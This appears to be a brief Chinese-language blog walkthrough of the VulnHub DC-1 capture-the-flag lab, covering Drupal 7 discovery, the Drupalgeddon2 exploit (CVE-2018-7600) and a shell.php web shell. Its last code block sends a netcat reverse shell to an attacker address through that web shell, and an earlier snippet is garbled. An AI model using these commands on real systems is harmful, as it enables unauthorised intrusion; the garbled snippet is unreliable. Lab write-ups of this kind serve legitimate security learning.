---
title: "VulnHub-DC1"
date:  2022-03-20
categories: [滲透測試]
tags:       [Vulnhub]
---
# 發現有port 80 -\> 直接瀏覽網頁



# 使用wappalyzer得知使用Drupal 7



# 搜尋已知Exploit來取得RCE

- CVE-2018-7600

  > Exploit:https://github.com/dreadlocked/Drupalgeddon2

# ls -\> 發現flag1



# 發現有shell.php

``` line-numbers
&1 ');}>
```

# 使用nc 監聽取回reverse shell(python pty)

``` line-numbers
http://10.0.2.4/shell.php?c=nc%20-e%20%2Fbin%2Fsh%2010.0.2.15%208080
nc -e /bin/sh 10.0.2.15 8080
python -c "import pty;pty.spawn('/bin/bash')"
```
